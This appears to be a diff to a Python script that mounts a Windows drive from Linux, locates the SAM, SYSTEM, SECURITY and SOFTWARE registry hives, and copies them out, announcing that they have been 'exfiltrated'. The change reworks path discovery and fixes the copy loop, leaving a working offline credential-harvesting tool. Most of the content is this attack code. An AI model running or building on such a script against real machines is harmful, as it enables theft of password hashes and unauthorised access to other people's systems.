@@ -9,7 +9,9 @@
 
 import sys, subprocess, argparse, time, shutil, os, datetime
 
+
 class Drive:
+
     def __init__(self):
         self.source = '' 
         self.fs = '' 
@@ -30,8 +32,6 @@ class Drive:
             return 'yes'
         else:
             return 'no'
-
-
 
 
 #Run the command sudo blkid and then recieve its output as a bytes
@@ -71,19 +71,53 @@ def mount_drive(drive):
             '/mnt/windows'.format(drive.get_source()), shell=True)
     time.sleep(1)
 
-def locate_hives():
-    raw_targets = os.listdir('/mnt/windows/Windows/System32/config')
+def locate_paths():
+    #target_directories = ['windows', 'system32', 'config']
+    target_directories = dict()
+    base_dir = os.listdir('/mnt/windows')
     targets = []
-    for target in raw_targets:
-        if 'sam' == target.casefold():
-            targets.append(target)
-        elif 'system' == target.casefold():
-            targets.append(target)
-
-        elif 'security' == target.casefold():
-            targets.append(target)
-        elif 'software' == target.casefold():
-            targets.append(target)
+    for next_dir in base_dir:
+        if 'windows' == next_dir.casefold():
+            target_directories['windows'] = next_dir
+    for next_dir in os.listdir('/mnt/windows/{}'.format(
+            target_directories['windows'])):
+        if 'system32' == next_dir.casefold():
+            target_directories['system32'] = next_dir
+    for next_dir in os.listdir('/mnt/windows/{}/{}'.format(
+            target_directories['windows'], 
+            target_directories['system32'])):
+        if 'config' == next_dir.casefold():
+            target_directories['config']  = next_dir
+    print(target_directories)
+    for hive in os.listdir('/mnt/windows/{}/{}/{}'.format(
+            target_directories['windows'], 
+            target_directories['system32'],
+            target_directories['config'])):
+        
+        if 'sam' == hive.casefold():
+            targets.append('/mnt/windows/{}/{}/{}/{}'.format(
+                target_directories['windows'], 
+                target_directories['system32'],
+                target_directories['config'],
+                hive))
+        elif 'system' == hive.casefold():
+            targets.append('/mnt/windows/{}/{}/{}/{}'.format(
+                target_directories['windows'], 
+                target_directories['system32'],
+                target_directories['config'],
+                hive))
+        elif 'security' == hive.casefold():
+            targets.append('/mnt/windows/{}/{}/{}/{}'.format(
+                target_directories['windows'], 
+                target_directories['system32'],
+                target_directories['config'],
+                hive))
+        elif 'software' == hive.casefold():
+            targets.append('/mnt/windows/{}/{}/{}/{}'.format(
+                target_directories['windows'], 
+                target_directories['system32'],
+                target_directories['config'],
+                hive))
     return targets
 
 def copy_winpayload():
@@ -92,17 +126,18 @@ def copy_winpayload():
     # to choose based off of mounting other ones and lsing
     # them. This will be slow but very cool
     
-    target_hives = locate_hives()
+    target_paths = locate_paths()
     stamp = str(datetime.datetime.now().timestamp())
     directory = '{}/hives_{}'.format(os.getcwd(), stamp[:10])
     os.mkdir(directory) 
+
     
-    for hive in target_hives:
+    for path in target_paths:
         try:
-            shutil.copyfile('/mnt/windows/Windows/System32/config/sam', 
-                    '{}/{}'.format(directory, hive))
+            shutil.copyfile(path, 
+                    '{}/{}'.format(directory, path.split('/').pop()))
         except FileNotFoundError as e:
-            print('{} not found'.format(hive))
+            print('{} not found'.format(path))
 
     print('registry hives have been succesfully exfiltrated to your pwd')
     # optimize this...
